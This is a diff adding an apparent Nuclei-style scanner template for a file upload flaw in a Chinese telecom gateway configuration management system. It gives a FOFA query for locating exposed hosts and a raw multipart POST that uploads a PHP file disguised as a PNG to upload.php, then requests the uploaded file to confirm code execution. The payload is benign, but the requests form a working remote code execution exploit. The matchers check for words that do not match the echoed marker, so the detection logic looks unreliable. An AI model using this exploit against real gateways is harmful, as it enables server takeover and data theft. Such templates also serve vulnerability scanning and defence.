@@ -1,0 +1,74 @@
+id: telecom-gateway-uploadphp-file-upload
+
+info:
+  name: "电信网关配置管理系统 upload.php 文件上传漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="img/dl.gif" && title="系统登录"
+        电信网关配置管理系统 upload.php 接口存在文件上传漏洞，攻击者可利用该漏洞上传恶意文件（如Webshell、恶意脚本）以实现远程代码执行或系统权限获取，进而导致服务器被完全控制或数据泄露。
+  tags: 电信网关配置管理系统
+
+flow: |
+  http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /manager/teletext/material/upload.php HTTP/1.1
+    Host: {{Hostname}}
+    Cache-Control: max-age=0
+    Upgrade-Insecure-Requests: 1
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Encoding: gzip, deflate
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en;q=0.6
+    Cookie: PHPSESSID=vsdl33qjn3fbslu7k3r99di5n3
+    Connection: close
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB33cDIYAxIrc9MsS
+
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+    Content-Disposition: form-data; name="fileToUpload"; filename="NTest.php"
+    Content-Type: image/png
+
+    <?php echo 'NdayTest'; unlink(__FILE__); ?>
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+    Content-Disposition: form-data; name="type"
+
+    img
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+    Content-Disposition: form-data; name="w"
+
+    1280
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+    Content-Disposition: form-data; name="h"
+
+    720
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+    Content-Disposition: form-data; name="userid"
+
+    1000398
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+    Content-Disposition: form-data; name="appid"
+
+    5
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS
+    Content-Disposition: form-data; name="uploadtime"
+
+    20230603_231117_1685805077294
+    ------WebKitFormBoundaryB33cDIYAxIrc9MsS--
+- raw:
+  - |
+    GET /NTest.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
+  - type: word
+    part: body
+    words:
+    - 'php'
